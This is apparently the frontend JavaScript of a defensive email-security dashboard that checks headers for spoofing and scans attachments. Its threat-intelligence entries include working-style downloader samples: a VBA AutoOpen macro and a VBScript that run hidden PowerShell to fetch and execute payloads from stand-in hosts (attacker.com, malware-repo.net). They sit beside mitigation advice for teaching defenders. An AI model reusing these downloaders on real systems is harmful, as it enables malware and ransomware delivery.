/**
 * app.js
 * Frontend controller for the Trust & Verify Security Dashboard.
 * Integrates with Express backend APIs and provides full client-side fallbacks.
 */

// Global state variables
let activeTab = 'headers';
let selectedFile = null;
let simulatedFileData = null; // Used for preset simulations

// Run Splash Screen on page load
document.addEventListener('DOMContentLoaded', () => {
  const splashScreen = document.getElementById('splash-screen');
  const splashProgress = document.getElementById('splash-progress');
  const splashBootLog = document.getElementById('splash-boot-log');

  const bootMessages = [
    { text: 'SYSTEM: STANDBY...', progress: 5 },
    { text: 'INITIALIZING SECURITY SUB-SYSTEMS...', progress: 18 },
    { text: 'LOADING THREAT-SIGNATURE DATABASE...', progress: 38 },
    { text: 'ESTABLISHING INTERCEPT HOOKS...', progress: 55 },
    { text: 'CONNECTING DNS SPF/DKIM ENDPOINTS...', progress: 75 },
    { text: 'VULNERABILITY CORE INTEGRITY: OK', progress: 92 },
    { text: 'TRUST & VERIFY DEPLOYED AND ONLINE.', progress: 100 }
  ];

  let currentMsgIdx = 0;

  function runBootSequence() {
    if (currentMsgIdx < bootMessages.length) {
      const step = bootMessages[currentMsgIdx];
      if (splashBootLog) splashBootLog.textContent = step.text;
      if (splashProgress) splashProgress.style.width = `${step.progress}%`;
      
      const delay = currentMsgIdx === bootMessages.length - 1 ? 500 : Math.random() * 200 + 150;
      
      currentMsgIdx++;
      setTimeout(runBootSequence, delay);
    } else {
      if (splashScreen) {
        splashScreen.classList.add('fade-out');
        setTimeout(() => {
          splashScreen.style.display = 'none';
        }, 800);
      }
    }
  }

  // Start sequence
  setTimeout(runBootSequence, 200);
});

// Preset raw email headers templates
const TEMPLATES = {
  spoofed_paypal: `From: "PayPal Account Security" <verification-department@resolve-paypal-invoice.com>
To: recipient@userinbox.org
Subject: CRITICAL: Your account has been temporarily restricted!
Date: Fri, 19 Jun 2026 14:03:00 +0000
Message-ID: <847239-paypal-resolve@secure-server.com>
Received: from mail.resolve-paypal-invoice.com (192.0.2.112) by mx.inboxgateway.net;
Received-SPF: softfail (inboxgateway.net: domain of resolve-paypal-invoice.com does not designate 192.0.2.112 as permitted sender)
Authentication-Results: mx.inboxgateway.net; dkim=fail; spf=softfail; dmarc=fail`,

  spf_fail: `From: "Microsoft Security Center" <no-reply@microsoft.com>
To: internal-employee@yourcompany.com
Subject: Warning: Critical system update required immediately
Date: Fri, 19 Jun 2026 10:20:15 +0100
Received: from malicious-relay.phishing-infrastructure.net (203.0.113.88) by exchange.yourcompany.com;
Received-SPF: fail (exchange.yourcompany.com: domain of microsoft.com does not designate 203.0.113.88 as authorized sender)
Authentication-Results: exchange.yourcompany.com; dkim=fail header.i=@microsoft.com; dmarc=fail`,

  safe_corporate: `From: "Google Workspace Team" <workspace-noreply@google.com>
To: account-owner@gmail.com
Subject: Monthly usage report and security summary
Date: Fri, 19 Jun 2026 09:12:12 -0700
Message-ID: <gws-summary-294829@mail.google.com>
Received: from mail-sender.google.com (209.85.220.41) by mx.google.com;
Received-SPF: pass (google.com: domain of workspace-noreply@google.com designates 209.85.220.41 as permitted sender)
Authentication-Results: mx.google.com; dkim=pass header.i=@google.com; dmarc=pass`
};

// UI Component Elements
const terminalLogs = document.getElementById('terminal-logs');
const findingsList = document.getElementById('findings-list');
const emptyFindings = document.getElementById('empty-findings');
const threatScoreText = document.getElementById('threat-score');
const threatLevelBadge = document.getElementById('threat-level-badge');
const threatVerdictSummary = document.getElementById('threat-verdict-summary');
const gaugeFillCircle = document.getElementById('gauge-fill-circle');

// 1. Tab Navigation Controls
function switchTab(tabId) {
  activeTab = tabId;
  
  // Update buttons
  document.getElementById('tab-headers-btn').classList.toggle('active', tabId === 'headers');
  document.getElementById('tab-files-btn').classList.toggle('active', tabId === 'files');
  
  // Update views
  document.getElementById('tab-headers').classList.toggle('active', tabId === 'headers');
  document.getElementById('tab-files').classList.toggle('active', tabId === 'files');
  
  addLogLine(`[INFO] Switched active sub-system console to: [${tabId.toUpperCase()}]`, 'system');
}

// 2. Preset Template Loading
function loadPreset(key) {
  if (TEMPLATES[key]) {
    document.getElementById('headers-input').value = TEMPLATES[key];
    addLogLine(`[INFO] Preset template loaded: "${key.replace('_', ' ').toUpperCase()}"`, 'success');
  }
}

// 3. File Selector & Drag & Drop Handling
const dropzone = document.getElementById('file-dropzone');

// Add events for dropzone styling
['dragenter', 'dragover'].forEach(eventName => {
  dropzone.addEventListener(eventName, (e) => {
    e.preventDefault();
    dropzone.classList.add('dragover');
  }, false);
});

['dragleave', 'drop'].forEach(eventName => {
  dropzone.addEventListener(eventName, (e) => {
    e.preventDefault();
    dropzone.classList.remove('dragover');
  }, false);
});

dropzone.addEventListener('drop', (e) => {
  const dt = e.dataTransfer;
  const files = dt.files;
  if (files.length > 0) {
    selectFile(files[0]);
  }
});

function handleFileSelect(event) {
  const files = event.target.files;
  if (files.length > 0) {
    selectFile(files[0]);
  }
}

function selectFile(file) {
  selectedFile = file;
  simulatedFileData = null; // Clear simulations

  // Update file card UI
  document.getElementById('selected-file-name').textContent = file.name;
  document.getElementById('selected-file-size').textContent = formatBytes(file.size);
  document.getElementById('file-info-card').style.display = 'flex';
  
  // Enable scan button
  document.getElementById('btn-run-files').removeAttribute('disabled');
  addLogLine(`[INFO] Attachment queued: ${file.name} (${formatBytes(file.size)})`, 'success');
}

function clearSelectedFile() {
  selectedFile = null;
  simulatedFileData = null;
  document.getElementById('file-input').value = '';
  document.getElementById('file-info-card').style.display = 'none';
  document.getElementById('btn-run-files').setAttribute('disabled', 'true');
  addLogLine(`[INFO] Attachment queue cleared.`, 'system');
}

// Format bytes helper
function formatBytes(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// 4. Test File Simulations
function simulateFile(filename, hash, content) {
  simulatedFileData = { filename, hash, content };
  selectedFile = null; // Clear actual uploaded file

  // Update card UI
  document.getElementById('selected-file-name').textContent = filename + " [SIMULATED]";
  document.getElementById('selected-file-size').textContent = hash ? "Hash-defined" : "Content-defined";
  document.getElementById('file-info-card').style.display = 'flex';

  // Enable scan button
  document.getElementById('btn-run-files').removeAttribute('disabled');
  addLogLine(`[INFO] Simulated threat payload loaded: ${filename}`, 'warn');
}

// 5. Terminal Logger Function
function addLogLine(text, type = 'system') {
  const line = document.createElement('div');
  line.className = `log-line ${type}`;
  line.textContent = text;
  terminalLogs.appendChild(line);
  terminalLogs.scrollTop = terminalLogs.scrollHeight;
}

function clearTerminal() {
  terminalLogs.innerHTML = '';
}

// 6. Threat Score Gauge Visual Updater
function updateThreatGauge(score, rating) {
  // Update gauge text
  threatScoreText.textContent = `${score}%`;
  
  // Update SVG dashoffset. Max circumference of r=40 is 251.2
  const offset = 251.2 - (score / 100) * 251.2;
  gaugeFillCircle.style.strokeDashoffset = offset;
  
  // Update color of circle based on severity
  let color = 'var(--accent-cyan)';
  let ratingClass = 'low';
  
  if (score >= 75) {
    color = 'var(--accent-red)';
    ratingClass = 'critical';
  } else if (score >= 50) {
    color = 'var(--accent-red)';
    ratingClass = 'high';
  } else if (score >= 25) {
    color = 'var(--accent-yellow)';
    ratingClass = 'medium';
  } else if (score > 0) {
    color = 'var(--accent-cyan)';
    ratingClass = 'low';
  } else {
    color = 'var(--accent-green)';
    ratingClass = 'safe';
  }
  
  gaugeFillCircle.style.stroke = color;
  
  // Update Badge
  threatLevelBadge.className = `threat-badge ${ratingClass}`;
  threatLevelBadge.textContent = rating.toUpperCase();
}

// 7. Update Vulnerability Findings List
function populateFindings(findings) {
  findingsList.innerHTML = '';
  
  if (!findings || findings.length === 0) {
    emptyFindings.style.display = 'block';
    findingsList.appendChild(emptyFindings);
    return;
  }
  
  emptyFindings.style.display = 'none';
  
  findings.forEach(find => {
    const card = document.createElement('div');
    card.className = `finding-card ${find.type === 'danger' ? 'danger' : 'warning'}`;
    
    const title = document.createElement('div');
    title.className = 'finding-title';
    title.textContent = `${find.type === 'danger' ? '⚠️' : '🔔'} ${find.title}`;
    
    const desc = document.createElement('div');
    desc.className = 'finding-desc';
    desc.textContent = find.message;
    
    card.appendChild(title);
    card.appendChild(desc);
    findingsList.appendChild(card);
  });
}

// 8. Run Email Header Spoofing Analysis
async function runHeaderAnalysis() {
  const headers = document.getElementById('headers-input').value;
  if (!headers || headers.trim() === '') {
    addLogLine('[ERROR] No email headers detected. Scanning canceled.', 'critical');
    return;
  }

  clearTerminal();
  addLogLine(`[SYSTEM] Starting Trust & Verify header parsing engine...`, 'system');
  addLogLine(`[SYSTEM] Accessing SPF/DKIM authentication database...`, 'system');
  
  // Disable button while processing
  const scanBtn = document.getElementById('btn-run-headers');
  scanBtn.setAttribute('disabled', 'true');
  
  // Local scan handler (reusable helper)
  const executeLocalScan = () => {
    // Run client side analysis
    if (typeof window.analyzeHeaders === 'function') {
      const results = window.analyzeHeaders(headers);
      
      // Simulate retro log loading
      setTimeout(() => {
        addLogLine('[OK] DNS validation endpoints loaded.', 'success');
      }, 300);
      
      setTimeout(() => {
        results.logs.forEach(log => {
          let type = 'success';
          if (log.includes('[CRITICAL]')) type = 'critical';
          else if (log.includes('[WARN]')) type = 'warn';
          addLogLine(log, type);
        });
        
        updateThreatGauge(results.score, results.threatLevel);
        populateFindings(results.details);
        
        let verdict = 'Email inspection complete. No critical structural anomalies detected.';
        if (results.score >= 70) {
          verdict = 'CRITICAL ALARM: Severe indicator of email spoofing or unauthorized relay deployment detected!';
        } else if (results.score >= 45) {
          verdict = 'WARNING: High probability of phishing or brand alignment mismatch.';
        } else if (results.score >= 25) {
          verdict = 'MEDIUM ALERT: Minor configurations missing, or authentication tags are missing.';
        }
        threatVerdictSummary.textContent = verdict;
        
        scanBtn.removeAttribute('disabled');
        addLogLine(`[SUCCESS] Intercept analysis complete. Score: ${results.score}%`, 'success');
      }, 800);
    } else {
      addLogLine('[ERROR] Analyzer engine module failed to load in sandbox.', 'critical');
      scanBtn.removeAttribute('disabled');
    }
  };

  // Check if we are running in a standard server environment or local file preview
  if (window.location.protocol === 'file:') {
    addLogLine(`[INFO] Local file environment detected. Launching Web-Crypto Sandbox analyzer...`, 'success');
    executeLocalScan();
    return;
  }

  try {
    const response = await fetch('/api/analyze-headers', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ headers })
    });
    
    if (!response.ok) {
      throw new Error('Server responded with error status');
    }
    
    const results = await response.json();
    
    // Animate terminal outputs
    results.logs.forEach((log, idx) => {
      setTimeout(() => {
        let type = 'success';
        if (log.includes('[CRITICAL]')) type = 'critical';
        else if (log.includes('[WARN]')) type = 'warn';
        addLogLine(log, type);
      }, (idx + 1) * 150);
    });

    setTimeout(() => {
      updateThreatGauge(results.score, results.threatLevel);
      populateFindings(results.details);
      
      let verdict = 'Email inspection complete. No critical structural anomalies detected.';
      if (results.score >= 70) {
        verdict = 'CRITICAL ALARM: Severe indicator of email spoofing or unauthorized relay deployment detected!';
      } else if (results.score >= 45) {
        verdict = 'WARNING: High probability of phishing or brand alignment mismatch.';
      } else if (results.score >= 25) {
        verdict = 'MEDIUM ALERT: Minor configurations missing, or authentication tags are missing.';
      }
      threatVerdictSummary.textContent = verdict;
      
      scanBtn.removeAttribute('disabled');
      addLogLine(`[SUCCESS] Server scan complete. Threat Rating: ${results.threatLevel}`, 'success');
    }, (results.logs.length + 1) * 150);

  } catch (err) {
    addLogLine(`[WARN] Backend connection failed. Falling back to local JS core parser...`, 'warn');
    executeLocalScan();
  }
}

// Helper to compute browser SHA-256
async function getSHA256Hash(file) {
  const arrayBuffer = await file.arrayBuffer();
  const hashBuffer = await crypto.subtle.digest('SHA-256', arrayBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// 9. Run Attachment Malware Scanner
async function runFileScan() {
  clearTerminal();
  const scanBtn = document.getElementById('btn-run-files');
  scanBtn.setAttribute('disabled', 'true');

  addLogLine(`[SYSTEM] Initializing attachment heuristic scan...`, 'system');

  // Case A: Testing with simulated data
  if (simulatedFileData) {
    addLogLine(`[INFO] Analyzing simulated environment file: ${simulatedFileData.filename}`, 'warn');
    
    setTimeout(() => {
      if (typeof window.analyzeFile === 'function') {
        const results = window.analyzeFile(
          simulatedFileData.filename,
          simulatedFileData.content,
          simulatedFileData.hash
        );
        
        results.logs.forEach(log => {
          let type = 'success';
          if (log.includes('[CRITICAL]')) type = 'critical';
          else if (log.includes('[WARN]')) type = 'warn';
          addLogLine(log, type);
        });

        updateThreatGauge(results.score, results.threatLevel);
        populateFindings(results.details);

        let verdict = 'File scanner complete. Structure conforms to safe file profiles.';
        if (results.score >= 75) {
          verdict = 'CRITICAL HAZARD: Executable script or signature match detected! File poses critical ransomware delivery risk.';
        } else if (results.score >= 50) {
          verdict = 'HIGH RISK: Executable extension or macro patterns detected. Immediate security quarantine advised.';
        } else if (results.score >= 25) {
          verdict = 'MEDIUM WARNING: Embedded archives or potential macros might hide obfuscated threats.';
        }
        threatVerdictSummary.textContent = verdict;
        
        scanBtn.removeAttribute('disabled');
        addLogLine(`[SUCCESS] Simulated scan complete. Threat Rating: ${results.threatLevel}`, 'success');
      } else {
        addLogLine(`[ERROR] Scanner engine module failed to load in sandbox.`, 'critical');
        scanBtn.removeAttribute('disabled');
      }
    }, 600);
    return;
  }

  // Case B: Scanning a real selected file
  if (!selectedFile) {
    addLogLine('[ERROR] No file selected for scanning.', 'critical');
    scanBtn.removeAttribute('disabled');
    return;
  }

  const executeLocalFileScan = async () => {
    try {
      addLogLine(`[INFO] Computing cryptographic signature local hash...`, 'system');
      const fileHash = await getSHA256Hash(selectedFile);
      
      // Read text content as a backup to check for scripts
      const fileText = await selectedFile.text();
      
      if (typeof window.analyzeFile === 'function') {
        const results = window.analyzeFile(selectedFile.name, fileText, fileHash);
        
        setTimeout(() => {
          results.logs.forEach(log => {
            let type = 'success';
            if (log.includes('[CRITICAL]')) type = 'critical';
            else if (log.includes('[WARN]')) type = 'warn';
            addLogLine(log, type);
          });
          
          updateThreatGauge(results.score, results.threatLevel);
          populateFindings(results.details);
          
          let verdict = 'File scanner complete. Structure conforms to safe file profiles.';
          if (results.score >= 75) {
            verdict = 'CRITICAL HAZARD: Executable script or signature match detected! File poses critical ransomware delivery risk.';
          } else if (results.score >= 50) {
            verdict = 'HIGH RISK: Executable extension or macro patterns detected. Immediate security quarantine advised.';
          } else if (results.score >= 25) {
            verdict = 'MEDIUM WARNING: Embedded archives or potential macros might hide obfuscated threats.';
          }
          threatVerdictSummary.textContent = verdict;
          
          scanBtn.removeAttribute('disabled');
          addLogLine(`[SUCCESS] Local sandbox scan complete. Score: ${results.score}%`, 'success');
        }, 500);
      }
    } catch (e) {
      addLogLine(`[ERROR] Local binary file reader failed: ${e.message}`, 'critical');
      scanBtn.removeAttribute('disabled');
    }
  };

  // Check backend server connection
  if (window.location.protocol === 'file:') {
    addLogLine(`[INFO] Local preview active. Scanning inside browser sandbox...`, 'success');
    await executeLocalFileScan();
    return;
  }

  try {
    // Compile form data for upload
    const formData = new FormData();
    formData.append('attachment', selectedFile);

    addLogLine(`[SYSTEM] Uploading payload to threat scanner server...`, 'system');
    
    const response = await fetch('/api/scan-file', {
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      throw new Error('Server returned upload error');
    }

    const results = await response.json();

    results.logs.forEach((log, idx) => {
      setTimeout(() => {
        let type = 'success';
        if (log.includes('[CRITICAL]')) type = 'critical';
        else if (log.includes('[WARN]')) type = 'warn';
        addLogLine(log, type);
      }, (idx + 1) * 150);
    });

    setTimeout(() => {
      updateThreatGauge(results.score, results.threatLevel);
      populateFindings(results.details);

      let verdict = 'File scanner complete. Structure conforms to safe file profiles.';
      if (results.score >= 75) {
        verdict = 'CRITICAL HAZARD: Executable script or signature match detected! File poses critical ransomware delivery risk.';
      } else if (results.score >= 50) {
        verdict = 'HIGH RISK: Executable extension or macro patterns detected. Immediate security quarantine advised.';
      } else if (results.score >= 25) {
        verdict = 'MEDIUM WARNING: Embedded archives or potential macros might hide obfuscated threats.';
      }
      threatVerdictSummary.textContent = verdict;
      
      scanBtn.removeAttribute('disabled');
      addLogLine(`[SUCCESS] Server scan complete. Threat Rating: ${results.threatLevel}`, 'success');
    }, (results.logs.length + 1) * 150);

  } catch (err) {
    addLogLine(`[WARN] Backend scan offline. Running sandbox parser client-side...`, 'warn');
    await executeLocalFileScan();
  }
}

// 10. Threat Intelligence Database & Modal Controller
const INTEL_DB = {
  spf: {
    badge: 'AUTHENTICATION',
    title: 'SPF (Sender Policy Framework)',
    desc: 'SPF is an email authentication method designed to detect email spoofing. It allows domain owners to publish a list of IP addresses or subnets that are authorized to send emails on behalf of their domain using DNS TXT records. During delivery, receiving mail servers verify the SPF record of the domain found in the SMTP "Mail From" address to check if the sending server\'s IP is listed.',
    code: `# Example DNS TXT Record for SPF
# Authorizes specific IPv4 range and Google Workspace, soft-fails all others
v=spf1 ip4:198.51.100.0/24 include:_spf.google.com ~all

# Strict fail setting (rejects unauthorized mail)
v=spf1 ip4:203.0.113.50 include:mail.protection.outlook.com -all`,
    mitigation: 'Publish a clear SPF record for all active and parked domains. Avoid using the permissive "+all" operator. Keep DNS lookups below the limit of 10 to prevent validation timeouts.'
  },
  dkim: {
    badge: 'CRYPTOGRAPHY',
    title: 'DKIM (DomainKeys Identified Mail)',
    desc: 'DKIM enables an organization to associate its name with an email message, cryptographically verifying its authenticity. It adds a digital signature to the email header which is validated against the sender\'s public key published in the DNS. This guarantees that the email indeed originated from the specified domain and that the message body and critical headers were not altered in transit.',
    code: `# Example DKIM Signature Header
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=cybernexus.com; s=nexus-key;
  h=from:to:subject:date:message-id;
  bh=L3Z2VTRoZXJlSXNOb3RoaW5nTWFsaWNpb3Vz...;
  b=ihYg/vXbK5P2pP8Z8KzD4s4B1k6T9x9vQ5...`,
    mitigation: 'Implement DKIM using strong cryptographic keys (RSA 2048-bit minimum or Ed25519). Rotate your DKIM keys every 6 months and revoke old DNS selector records.'
  },
  dmarc: {
    badge: 'ALIGNMENT & POLICY',
    title: 'DMARC (Domain-based Message Authentication)',
    desc: 'DMARC builds upon SPF and DKIM authentication. It allows domain owners to specify how the receiver should handle emails that fail SPF or DKIM checks (reject them, quarantine them, or deliver them). Crucially, DMARC requires "Identifier Alignment," meaning the domain in the visible "From:" header must match the domains authenticated by SPF and DKIM.',
    code: `# DNS TXT Record at: _dmarc.cybernexus.com
# Policy: Reject 100% of failed emails, send XML reports to security mailbox
v=DMARC1; p=reject; pct=100; rua=mailto:dmarc-reports@cybernexus.com; adkim=r; aspf=r`,
    mitigation: 'Deploy DMARC starting with a "p=none" monitoring policy. Analyze XML reports to identify legitimate sending sources. Graduate to "p=quarantine" and finally enforce a strict "p=reject" policy.'
  },
  macros: {
    badge: 'THREAT VECTOR',
    title: 'Office Document Macros (VBA)',
    desc: 'Attackers embed malicious VBA (Visual Basic for Applications) macros inside Microsoft Office documents (like Word or Excel). They send these as email attachments with names like "Invoice.doc" or "Unpaid_Bill.xlsm". When opened, the document prompts the victim to "Enable Content" or "Enable Editing." Doing so triggers the VBA macro to execute commands, download a payload, and deploy ransomware.',
    code: `' Malicious VBA Downloader Macro Example
Sub AutoOpen()
  Dim wsh As Object
  Set wsh = CreateObject("WScript.Shell")
  ' Bypasses execution policy, downloads payload silently in background
  wsh.Run "powershell.exe -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://attacker.com/payload.exe', '$env:temp\\temp.exe'); Start-Process '$env:temp\\temp.exe'", 0, True
End Sub`,
    mitigation: 'Set default configurations to block Office macros from running in files downloaded from the internet. Educate staff to never enable content/editing on unexpected file attachments.'
  },
  wsh: {
    badge: 'THREAT VECTOR',
    title: 'Windows Script Host (WSH) Loaders',
    desc: 'Attackers send scripts written in JavaScript (.js), VBScript (.vbs), or Windows Script File (.wsf) formats, often inside compressed zip archives. When clicked, these scripts run natively via the Windows Script Host engine (wscript.exe) or PowerShell. They execute system commands, bypass security controls, and download ransomware payloads directly into temporary user directories.',
    code: `' Simulated VBScript Ransomware Downloader
Set objShell = CreateObject("WScript.Shell")
payloadUrl = "http://malware-repo.net/ransom.exe"
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\ransom.exe"
cmd = "powershell -noprofile -windowstyle hidden -command Invoke-WebRequest -Uri '" & payloadUrl & "' -OutFile '" & tempPath & "'; Start-Process '" & tempPath & "'"
objShell.Run cmd, 0, True`,
    mitigation: 'Reassociate script extensions (.vbs, .vbe, .js, .jse, .wsf, .wsh) to open with Notepad.exe by default. Restrict PowerShell scripts to run only when cryptographically signed.'
  },
  links: {
    badge: 'THREAT VECTOR',
    title: 'Phishing Links & Exploit Redirects',
    desc: 'Instead of attaching malware files directly, attackers include hyperlinks in emails that lead to malicious servers. These links redirect users to pages hosting browser exploit kits (targeting unpatched browser vulnerabilities) or credential harvesting forms designed to steal administrative passwords to deploy network-wide ransomware.',
    code: `<!-- Phishing anchor masquerading as secure banking link -->
<a href="http://login.verification-portal-cybernexus.com/auth" style="text-decoration:none;">
  Verify Your Account Security Settings
</a>`,
    mitigation: 'Utilize secure email gateway filters with URL sandboxing and link rewriting. Enforce phishing-resistant multi-factor authentication (MFA) to minimize credential exposure.'
  },
  vba: {
    badge: 'SYSTEM HYGIENE',
    title: 'Blocking VBA Macro Execution',
    desc: 'Office macros represent one of the most common vectors for initial system access. Systems can be hardened by completely blocking macros in Office documents downloaded from the internet using Group Policy Objects (GPOs), or disabling the VBA feature altogether across your organization.',
    code: `# Windows Registry Key to block internet macros in Word
[HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Office\\16.0\\word\\security]
"blocklitefrominternet"=dword:00000001`,
    mitigation: 'Enforce Microsoft GPO: "Block macros from running in Office files from the Internet." Regularly audit macro usage across different corporate departments.'
  },
  inspect_headers: {
    badge: 'USER TRAINING',
    title: 'Email Header Verification Protocols',
    desc: 'Verifying headers manually is a key skill for IT administrators and security teams. Legitimate emails must show domain alignment: the domain in the "From" field should align with the SPF-checked domain and the DKIM signing domain. Mismatches indicate spoofing attempts.',
    code: `# Suspicious Header Match Checklist:
1. "From: Bank Support <alerts@attacker-site.org>" -> Brand domain mismatch
2. "Received-SPF: softfail" or "fail" -> Server unauthorized
3. "Authentication-Results: dkim=fail" -> Cryptographic signature modified`,
    mitigation: 'Train users to check the raw sender address rather than relying on the visible display name. Configure external email gateways to append warnings to incoming external messages.'
  },
  edr: {
    badge: 'ENDPOINT DEFENSE',
    title: 'Endpoint Detection & Response (EDR)',
    desc: 'Traditional antivirus scans files based on static signature lists. If ransomware is brand new (zero-day), it bypasses antivirus. EDR software continuously monitors active system behaviors. It flags actions like unauthorized mass file renames/encryptions, child shell processes spawned by Office files, or modifications to shadow copy backup settings.',
    code: `# High-Severity EDR Behavioral Event Alert
Alert: [SUSPICIOUS_PROCESS_SPAWN]
Parent Process: WINWORD.EXE (PID: 8432)
Child Process: POWERSHELL.EXE (PID: 1240)
Command: powershell.exe -windowstyle hidden -enc SQ52b2t...
Action: Process Terminated by SentinelOne Agent`,
    mitigation: 'Deploy active EDR agents in quarantine/enforcement mode. Configure EDR rules to immediately terminate processes that attempt to delete Volume Shadow Copies (vssadmin.exe).'
  }
};

function openIntelligenceModal(topic) {
  const modal = document.getElementById('intel-modal');
  const title = document.getElementById('intel-modal-title');
  const badge = document.getElementById('intel-modal-badge');
  const heading = document.getElementById('intel-modal-heading');
  const desc = document.getElementById('intel-modal-desc');
  const code = document.getElementById('intel-modal-code');
  const mitigation = document.getElementById('intel-modal-mitigation');

  const data = INTEL_DB[topic];
  if (!data) return;

  // Populate data
  title.textContent = `PROTOCOL_INTELLIGENCE://${topic.toUpperCase()}`;
  badge.textContent = data.badge;
  heading.textContent = data.title;
  desc.textContent = data.desc;
  code.textContent = data.code;
  mitigation.textContent = data.mitigation;

  // Open modal
  modal.classList.add('active');
}

function closeIntelligenceModal() {
  const modal = document.getElementById('intel-modal');
  if (modal) {
    modal.classList.remove('active');
  }
}

// Close modal if clicking outside window
window.addEventListener('click', (e) => {
  const modal = document.getElementById('intel-modal');
  if (e.target === modal) {
    closeIntelligenceModal();
  }
});

